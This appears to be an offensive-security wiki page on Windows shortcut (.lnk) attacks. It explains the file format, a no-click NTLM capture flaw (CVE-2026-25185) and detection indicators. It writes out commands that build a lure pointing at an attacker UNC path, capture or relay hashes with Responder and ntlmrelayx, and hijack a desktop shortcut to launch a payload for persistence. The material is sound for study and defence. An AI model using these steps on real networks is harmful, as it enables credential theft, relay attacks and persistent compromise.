---
title: LNK File Attacks
permalink: /wiki/offsec-notes/concepts/lnk-file-attacks/
layout: single
author_profile: true
tags:
- offsec-notes
- concept
---

# LNK File Attacks

**Category:** Initial Access / Credential Theft / Persistence
**MITRE ATT&CK:** T1547.009 — Shortcut Modification; T1187 — Forced Authentication
**Related:** [Phishing](/wiki/offsec-notes/concepts/phishing/), [Post Exploitation](/wiki/offsec-notes/concepts/post-exploitation/), [Active Directory Attacks](/wiki/offsec-notes/concepts/active-directory-attacks/)

## Overview
Windows shortcut files (.lnk) are complex binary structures with many fields and extra data blocks. Several of these fields are processed when a file is merely *viewed* in Explorer (no user click required), making malicious .lnk files particularly dangerous on shared network drives. CVE-2026-25185 is a specific vulnerability in this class: a crafted .lnk triggers `PathFileExistsW` to an attacker-controlled UNC path, forcing NTLM authentication from the Windows indexer running as the machine account.

## .lnk File Structure

### Core Sections

**ShellLinkHeader:** Contains flags, file attributes, timestamps, icon index, hot key assignment, and `ShowCommand`.

Notable flags:
- `RunAsUser` — prompts for elevation when launched
- `PreferEnvironmentPath` — unexpected behavior when `TargetIDList` present
- `RunWithShimLayer` — applies shim from `ShimDataBlock`

**LinkTargetIDList:** The primary resolution target. When valid, overrides all other path fields. When invalid, other fields (RELATIVE_PATH, ENVIRONMENT_PROPS) take over.

**StringData:**
- `NAME_STRING` — tooltip shown on hover
- `RELATIVE_PATH` — fallback resolution path (only works if `TargetIDList` is invalid)
- `WORKING_DIR` — working directory for the launched target
- `COMMAND_LINE_ARGUMENTS` — up to 65,535 chars; supports newlines (useful for embedded scripts)
- `ICON_LOCATION` — file containing the icon resource

**ExtraData Blocks** (append-only; identified by signature):
| Block | Signature | Notes |
|-------|-----------|-------|
| DARWIN_PROPS | 0xa0000006 | Legacy install-on-demand; triggers special code path |
| ICON_ENVIRONMENT_PROPS | 0xa0000007 | Alternative icon path — **CVE-2026-25185 trigger** |
| ENVIRONMENT_PROPS | — | Another executable path field |
| PROPERTY_STORE_PROPS | — | Arbitrary data; can be used for data smuggling |
| CONSOLE_PROPS | — | Console settings (ignored in Windows Terminal) |
| TRACKER_PROPS | — | Contains machine NETBIOS name from creation |
| VISTA_AND_ABOVE_IDLIST_PROPS | — | Used for network resource shortcuts |

## CVE-2026-25185 — No-Click NTLM Capture

### Vulnerability Mechanics
When a .lnk is parsed by `CShellLink::_LoadFromStream` (in `windows.storage.dll`):

1. Code checks for **DARWIN_PROPS** block (signature `0xa0000006`) → if present, calls `_UpdateIconFromExpIconSz`
2. Inside `_UpdateIconFromExpIconSz`: checks for **ICON_ENVIRONMENT_PROPS** block (signature `0xa0000007`)
3. If present, reads `TargetUnicode` at offset +268, expands environment variables, passes result to **`PathFileExistsW`**
4. `PathFileExistsW` with a UNC path (`\\attacker\share\file`) triggers **SMB authentication** to the attacker

**No user interaction required.** The following also trigger this code path:
- Windows Search/Indexer (`SearchProtocolHost.exe`) — running as machine account
- Windows Defender scanning
- Simply navigating a folder containing the .lnk in Explorer

### Craft the Malicious .lnk
Using TrustedSec's LnkMeMaybe tool:
```bash
# Clone tool
git clone https://github.com/trustedsec/LnkMeMaybe

# Generate CVE-2026-25185 lnk
LnkMeMaybe.exe cve-2026-25185 --output evil.lnk --unc \\<attacker_ip>\share\icon.ico
```

The resulting .lnk has:
- A valid DARWIN_PROPS block
- ICON_ENVIRONMENT_PROPS with `TargetUnicode` pointing to `\\attacker\share\`

### Capture Credentials
```bash
# On attacker: start Responder to capture NTLMv2 hashes
responder -I eth0 -v

# Or relay with ntlmrelayx
ntlmrelayx.py -t ldap://<DC> -smb2support

# Drop the lnk on a shared network drive
# When any user browses the folder OR the indexer runs → hash captured
```

The indexer runs as the machine account (`DOMAIN\COMPUTERNAME$`). Machine account hashes can be relayed for RBCD attacks or certificate abuse (ADCS ESC8).

### Patch
Patched in March 10, 2026 security update. Disclosed 2025-12-10, patch released 2026-03-10.

## Shortcut Modification for Persistence (T1547.009)

Modify an existing .lnk to run attacker payload before/instead of the original target:
```powershell
$lnk = (New-Object -COM WScript.Shell).CreateShortcut("C:\Users\Public\Desktop\target.lnk")
$lnk.TargetPath = "C:\Windows\System32\cmd.exe"
$lnk.Arguments = "/c C:\temp\payload.exe"
$lnk.Save()
```

## Hotkey Assignment
The .lnk header can set a hotkey (without modifier key) that bypasses the Windows UI restriction. A .lnk placed on the desktop with `HotKey = F1` will execute when F1 is pressed — without any modifier.

## .lnk as Data Exfil / Smuggling
`PROPERTY_STORE_PROPS` block can hold arbitrary data. Use for embedding data within an otherwise-legitimate looking shortcut.

## COMMAND_LINE_ARGUMENTS Trick
Supports newlines. For PowerShell payloads:
```
powershell.exe -Command handles
```
→ The arguments can contain a full formatted PowerShell script with newlines embedded in the .lnk's argument field.

## Tooling
- **LnkMeMaybe** (github.com/trustedsec/LnkMeMaybe) — C# library, UI, and CLI tool; supports CVE-2026-25185, custom .lnk creation
- **LnkUi** — research-oriented UI for reading/modifying .lnk internals
- **Titanis** (TrustedSec) — CLI framework adopted by LnkMeMaybe

## Detection Notes
- Unexpected .lnk files on shared drives (especially in IT/staging shares)
- SMB authentication from `SearchProtocolHost.exe` to external/unexpected hosts
- `PathFileExistsW` calls to UNC paths from `explorer.exe` or indexer processes
- .lnk files with non-standard ExtraData blocks (DARWIN_PROPS + ICON_ENVIRONMENT_PROPS combination)
- TRACKER_PROPS contains the NETBIOS name of the machine that created the .lnk — forensic artifact

## References
- TrustedSec — "LnkMeMaybe — A Review of CVE-2026-25185" (2026-04-19)
- MS-SHLLINK specification — Microsoft Open Specs
- MSRC CVE-2026-25185 — Severity: Important (Spoofing); patched 2026-03-10
